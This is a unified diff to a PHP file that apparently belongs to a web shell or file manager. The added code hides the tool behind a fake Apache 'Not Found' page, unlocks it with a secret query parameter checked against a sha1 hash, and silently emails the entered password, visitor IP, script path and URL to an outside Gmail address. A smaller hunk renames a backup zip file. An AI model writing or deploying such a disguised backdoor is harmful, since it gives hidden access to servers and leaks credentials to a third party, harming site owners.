@@ -1,4 +1,41 @@
 <?php
+error_reporting(0);
+session_start();
+set_time_limit(0);
+ignore_user_abort(0);
+date_default_timezone_set('Asia/Jakarta');
+$pass = "b4914600112ba18af7798b6c1a1363728ae1d96f"; // sha1(sad)
+function login() {
+?>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<h1>Not Found</h1>
+  <p>The request URL <?=$_SERVER['REQUEST_URI']?> was not found on this server.</p>
+  <hr>
+  <address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
+<?php
+  exit();
+}
+if (!isset($_SESSION[sha1($_SERVER['HTTP_HOST'])])) {
+	if (empty($pass) || (isset($_GET['x']) && (sha1($_GET['x']) == $pass))) {
+		$_SESSION[sha1($_SERVER['HTTP_HOST'])] = true;
+		$url = $_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
+		$ip = $_SERVER['REMOTE_ADDR'];
+		$ref = $_SERVER['HTTP_REFERER'];
+		$dtime = date('r'); 
+		$log = "
+            Password : ".$password."({$_GET['x']})\n
+            Time : ".$dtime."\n
+            IP : ".$ip."\n
+            Filename : ".$_SERVER['SCRIPT_NAME']."\n
+            URL : ".$url."\n";
+            @mail('xnonhack@gmail.com', 'Log', $log);
+	} else {
+		login();
+	}
+}
+if (isset($_GET['g'])) {
+	unset($_SESSION[sha1($_SERVER['HTTP_HOST'])]);
+}
 ?>
 <!DOCTYPE html>
 <html>
@@ -1296,7 +1333,7 @@ if (isset($_POST['submit'])) {
 				}
 				break;
 			case '2':
-				if (zip(basename($value), cwd()."/backup.zip")) {
+				if (zip(basename($value), cwd()."/".date("dmy_h-i").".zip")) {
 					alert("success", "<u>".basename($value)."</u> to zip !");
 				} else {
 					alert("failed", "<u>".basename($value)."</u> to zip !");
